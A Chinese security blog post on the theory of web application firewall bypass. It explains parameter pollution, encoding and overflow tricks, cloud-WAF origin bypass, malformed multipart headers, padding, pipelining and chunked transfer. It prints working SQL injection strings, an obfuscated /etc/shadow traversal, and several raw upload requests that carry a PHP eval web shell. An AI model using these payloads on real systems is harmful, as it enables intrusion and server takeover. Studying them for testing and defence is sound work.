---
data: 2024-06-30
tags:
  - 外网打点
博客链接: https:/www.cnblogs.com/Ho1dF0rward/p/18284878
关联: []
title: Waf绕过理论篇
---
## 设备类型
> 由上到下,waf的检测细腻度依次降低

- 网络层WAF：先拦截流量，进行检测后再转发给
- 应用层WAF：先经过apache/nginx解析后再交给php处理
- 云 WAF（CDN+WAF）：简单的看成CDN加上软件WAF的结合体，既可以抗住DDos攻击，也可以过滤出部分简单的Payload攻击代码，甚至对流量也有一定的清洗作用
- 自定义WAF（自己写的一些规则）在系统后台内置一项安全功能以便管理者使用
## 思路概览
那么由设备的一些特点,我们其实也就可以归纳出相关的一些绕过思路了.
### 性能负载
> 网络层

WAF的首要要求就是不会干扰到正常应用的运行,我们可以尝试大量的数据请求,来迫使WAF无法精细化检测.
### 解析差异
> 应用层

使用后端语言的特性,或者协议的模糊点.来实现WAF和应用程序对同一流量的不同解析结果编码绕过
### 架构漏洞
> 云WAF

利用厂商的网络配置或者网段设置进行绕过.
### 编码绕过
> 自定义正则

使用一些正则去匹配相关的恶意数据,我们使用一些畸形的数据去绕过.
## 请求场景
我们根据我们的实际实战的一个请求场景来进行相关手法的梳理.
### 通用手法
#### 解析差异
##### http参数污染
由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成waf和后端的识别不同的错误。
```json
?id=1&id=2&id=1' or '1'='1
```
##### Content-Type字符编码
> 为什么说是解析差异,因为WAF可能严格按照http协议来进行加密解密,但后端服务器却没有做任何的处理.

![image.png](https://cdn.nlark.com/yuque/0/2024/png/27874700/1712583505348-84c35112-844d-4d50-b361-6bcd8a9d66c7.png#averageHue=%23f2efee&clientId=u93d253c4-cada-4&from=paste&height=323&id=mVcdl&originHeight=323&originWidth=1863&originalType=binary&ratio=1&rotation=0&showTitle=false&size=157920&status=done&style=none&taskId=u172d3e9d-6631-40da-ad54-082ecee327d&title=&width=1863)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27874700/1712583519114-9b0b9298-6ae3-450c-b100-df9bf2958123.png#averageHue=%23f2efef&clientId=u93d253c4-cada-4&from=paste&height=347&id=yhJlu&originHeight=347&originWidth=1109&originalType=binary&ratio=1&rotation=0&showTitle=false&size=138376&status=done&style=none&taskId=u80004d49-8784-461f-988c-fa28df42b8d&title=&width=1109)
##### Content-Encoding编码
> 原理同上

Content-Encoding 是 HTTP 头部字段之一，用于指示对请求或响应主体数据进行的内容编码方式。它指示了服务器对实体主体进行了何种类型的编码，以便在传输过程中进行压缩或其他操作。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27874700/1712584210075-3be8390f-047f-4983-a5e8-02e1eb87f286.png#averageHue=%23f7f7f7&clientId=u93d253c4-cada-4&from=paste&height=1052&id=u26e815f9&originHeight=1052&originWidth=1644&originalType=binary&ratio=1&rotation=0&showTitle=false&size=448618&status=done&style=none&taskId=u557a3651-153b-4215-9833-f878a5003ab&title=&width=1644)

#### 编码技术(编码绕过)
```json
http://example.com/index.php?page_id=-1 UnIoN SeLeCT 1,2,3,4 ///大小写

UniOn%28SeLeCt+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%29 //url编码

../../etc/shadow混淆：
%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFshadow  //unicod混淆

union = uю%69яю    //宽字节
```
#### 内容溢出
```json
?id=1+and+sleep(3)+and+111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
```
**OpenResty uri参数溢出漏洞**
OpenResty 通过ngx.req.get_uri_args、ngx.req.get_post_args获取参数，只能获取到前100个参数，当提交第101个参数时，uri参数溢出，无法正确获取到第101个及以后的参数
```json
127.0.0.1/test?a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9& id=1 union select 1,schema_name,3 from INFORMATION_SCHEMA.schemata
```
#### 架构漏洞
##### 源ip访问
当前多数云WAF架构，例如百度云加速、360安全卫士等，通过更改DNS解析，把流量引入WAF集群，流量经过检测后转发请求到源站。如图，liusscs.com接入接入WAF后，liusscs.comd的DNS解析结果指向WAF集群，用户的请求将发送给WAF集群，WAF集群经过检测认为非攻击请求再转发给源站。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27874700/1712591435741-1c38581d-97af-4ec4-b355-ae375fbfc969.png#averageHue=%23fbfaf5&clientId=ue9aec836-f964-4&from=paste&height=532&id=u6b6ad9de&originHeight=532&originWidth=1323&originalType=binary&ratio=1&rotation=0&showTitle=false&size=223030&status=done&style=none&taskId=ue2f1fcea-9553-44ba-bf88-e8614749800&title=&width=1323)
从云WAF架构考虑，如果HTTP请求都没有经过WAF集群直接到达源站，顺理成章bypass WAF。
##### 利用同网段
一些在云服务商的站点，同时使用云服务商提供的WAF服务。当流量不是通过DNS解析引流到WAF，流量必须经过WAF的检测，这是不能通过发行源站进行绕过。可以考虑在云服务商买一台VPS，通过VPS攻击目标站点，因为流量是局域网，可能不经过WAF检测，实现绕过。能不能成功，关键在于云服务商的网络配置。
### POST传参
可以使用Content-Type: multipart/form-data来传递参数.

![image.png](https://cdn.nlark.com/yuque/0/2024/png/27874700/1712590218589-3c4be4e1-c525-4bd9-9ede-c73a7b9b1126.png#averageHue=%23fafafa&clientId=u7583e18c-d01a-4&from=paste&height=784&id=u6d00eb14&originHeight=784&originWidth=1732&originalType=binary&ratio=1&rotation=0&showTitle=false&size=164793&status=done&style=none&taskId=u20bbbc46-1f13-4170-80cc-19b5f0bf16d&title=&width=1732)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27874700/1712590277259-e08755be-eb7d-4c76-81a6-9bb87cd471bb.png#averageHue=%231f2024&clientId=u7583e18c-d01a-4&from=paste&height=877&id=u5742fdbf&originHeight=877&originWidth=1484&originalType=binary&ratio=1&rotation=0&showTitle=false&size=97057&status=done&style=none&taskId=uab08e37d-9deb-4d4e-bdc3-dc13f5b97ca&title=&width=1484)
## 文件上传
### 解析差异
这是一个文件上传的流量
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27874700/1712585109028-340f67ce-c522-4b15-9121-a747d1072bf5.png#averageHue=%23fafafa&clientId=u93d253c4-cada-4&from=paste&height=704&id=ue0c5c3a9&originHeight=704&originWidth=1598&originalType=binary&ratio=1&rotation=0&showTitle=false&size=129322&status=done&style=none&taskId=u6f226d63-aa7f-4377-8a5b-283dab2f0d0&title=&width=1598)
解析差异
#### Content-Disposition
说到底还是解析差异的问题,我们使用一些畸形的Content-Disposition,来让waf无法识别出是文件上传.
```json
Content-Disposition: "form-data"; name=file_x; filename="xx.php"   //引号变换
Content-Disposition: form-data; name=file_x; filename="xx.php"
Content-Disposition: form-data; name="file_x"; filename="xx.php     //;变换
Content-Disposition: form-data; name="file_x"; filename="xx.php;   
Content-Disposition: "form-data"; name="file_x"; filename=[0x09]"xx.php" //使用换行符号

Content-Disposition: form-data; name="file_x";;; filename="test.php" //使用多个；;
Content-Disposition: form-data; name=="file_x"; filename===="test.php" //使用多个等号
Content-Disposition: form-da+ta; name="file_x"; filename="xx.php"   //变换Content-Disposition的值
Content-Disposition: fo    r m-dat a; name="file_x"; filename="xx.php"
Content-Disposition: form-dataxx; name="file_x"; filename="xx.php"
```
#### boundary
```json
Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 //大小变化

Content-Type: multipart/form-data a\|/?!@#$%^() boundary=----WebKitFormBoundarye111

Content-Type: multipart/form-data a\|/?!@#$%^() boundary=----WebKitFormBoundarye111
Content-Type: multipart/form-data,a\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 //使用空格和逗号可以在之间添加任何字符 
Content-Type: multipart/form-data;bypass&123**{|}boundary=----WebKitFormBoundarye111    //仅（PHP可行）
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc  //末尾直接使用逗号或分号隔开插入任何值
```
#### 顺序交换
```json
Content-Disposition: form-data; filename="xx.php"; name="file_x" //交换name和filename的顺序

Content-Type: image/png
Content-Disposition: form-data; name="upload_file"; filename="shell.php" //交换Content-Disposition和Content-Type的顺序
```
#### **boundary内容重复**
这里其实就很类似于http参数污染了
```json
------WebKitFormBoundarymeEzpUTMsmOfjwAA
Content-Disposition: form-data; name="upload_file"; filename="shell.jpg"
Content-Type: image/png

<?php @eval($_POST['hack']); ?>
------WebKitFormBoundarymeEzpUTMsmOfjwAA
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: image/png

<?php @eval($_POST['hack']); ?>
------WebKitFormBoundarymeEzpUTMsmOfjwAA
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundarymeEzpUTMsmOfjwAA--
```
#### 数据截断
```json
Content-Disposition: for
m-data; name="upload_
file"; fi
le
name="sh
ell.p
h
p"//使用换行

Content-Disposition: form-data; name="upload_file"; filename="shell.jpg;.php"//使用分号
Content-Disposition: form-data; name="upload_file"; filename="shell.php[0x00].jpg"//使用00截断

Content-Disposition: form-data; name="upload_file"; filename="shell.jpg'.php"//使用单引号,php<5.3 单双引号截断特性。
Content-Disposition: form-data; name="upload_file"; filename="shell.jpg".php"
```
### 性能负载
> 在不同的位置插入大量垃圾数据

```json
POST /Pass-02/index.php HTTP/1.1
Host: hackrock.com:813
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzEHC1GyG8wYOH1rf
Connection: close

------WebKitFormBoundaryzEHC1GyG8wYOH1rf
Content-Disposition: form-data; name="upload_file"; fbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf; 
filename="shell.php"
Content-Type: image/png

<?php @eval($_POST['x']);?>

------WebKitFormBoundaryzEHC1GyG8wYOH1rf
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryzEHC1GyG8wYOH1rf--
```
```json
POST /Pass-01/index.php HTTP/1.1
Host: hackrock.com:813
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9
Connection: close

------WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9
Content-Disposition: form-data; name="upload_file";filename="shell.php"
Content-Type: image/png

<?php @eval($_POST['x']);?>

------WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9--
```
```json
POST /Pass-01/index.php HTTP/1.1
Host: hackrock.com:813
Content-Type: multipart/form-data bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9boundary=----WebKitFormBoundaryzEHC1GyG8wYOH1rf
Connection: close
Content-Length: 319

------WebKitFormBoundaryzEHC1GyG8wYOH1rf
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: image/png

<?php @eval($_POST['x']);?>

------WebKitFormBoundaryzEHC1GyG8wYOH1rf
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryzEHC1GyG8wYOH1rf--
```
## 其他特殊手法
### pipline绕过
pip原理：http 协议是由 tcp 协议封装而来,当浏览器发起一个 http 请求时,浏览器先和服务器建立起连接 tcp 连接,然后发送 http 数据包(即我们用 burpsuite 截获的数据),其中包含了一个 Connection 字段,一般值为 close,apache 等容器根据这个字段决定是保持该tcp连接或是断开.当发送的内容太大,超过一个 http 包容量,需要分多次发送时,值会变成 keep-alive,即本次发起的 http 请求所建立的 tcp 连接不断开,直到所发送内容结束 Connection 为 close 为止.
绕过原理：数据包较大时，使用分段传输，waf可能只检测了第一个数据包，对后续的数据包位进行检测.
**例：**
**进行此操作时，需要关闭自动填充Connect-Length**
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27874700/1712589819185-439208d0-2560-44ef-b6e6-c9f222a4c483.png#averageHue=%23f7f5f5&clientId=u93d253c4-cada-4&from=paste&height=1120&id=ueb9e9db5&originHeight=1120&originWidth=1886&originalType=binary&ratio=1&rotation=0&showTitle=false&size=339947&status=done&style=none&taskId=u0e9538a7-3cac-4a29-991a-47304240323&title=&width=1886)
修改Connection字段值为keep-alive，将带有攻击语句的数据请求附加到正常请求后面再发送一遍。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27874700/1712589838135-8923ae77-d890-4deb-92ae-e7de2afb6b6e.png#averageHue=%23f2f1f1&clientId=u93d253c4-cada-4&from=paste&height=1466&id=u29669e96&originHeight=1466&originWidth=2144&originalType=binary&ratio=1&rotation=0&showTitle=false&size=472154&status=done&style=none&taskId=u36fbfb3b-f6b9-473a-9d1a-b3637c01b72&title=&width=2144)
### 分块编码传输
分块传输编码（Chunked transfer encoding）是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由应用服务器发送给客户端应用（ 通常是网页浏览器）的数据可以分成多个部分。分块传输编码只在HTTP协议1.1版本（HTTP/1.1）中提供。
分块技术的意思是说，实体被分成许多的块，也就是应用层的数据，TCP在传送的过程中，不对它们做任何的解释，而是把应用层产生数据全部理解成二进制流，然后按照MSS的长度切成一分一分的，一股脑塞到tcp协议栈里面去，而具体这些二进制的数据如何做解释，需要应用层来完成。
通常，HTTP应答消息中发送的数据是整个发送的，Content-Length消息头字段表示数据的长度。数据的长度很重要，因为客户端需要知道哪里是应答消息的结束，以及后续应答消息的开始。然而，使用分块传输编码，数据分解成一系列数据块，并以一个或多个块发送，这样服务器可以发送数据而不需要预先知道发送内容的总大小。这在http协议中也是个常见的字段，用于http传送过程的分块技术，原因是http服务器响应的报文长度经常是不可预测的，使用Content-length的实体搜捕并不是总是管用
快速编码：bp插件chunked-coding-converter
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27874700/1712590101872-64285f6e-8dc3-4bd0-a57b-31705f191fe1.png#averageHue=%23fbf9f8&clientId=uffe64a73-7b46-4&from=paste&height=385&id=ubefb2717&originHeight=385&originWidth=709&originalType=binary&ratio=1&rotation=0&showTitle=false&size=78979&status=done&style=none&taskId=ud337f114-69dc-488b-a845-e8778e8ddc7&title=&width=709)



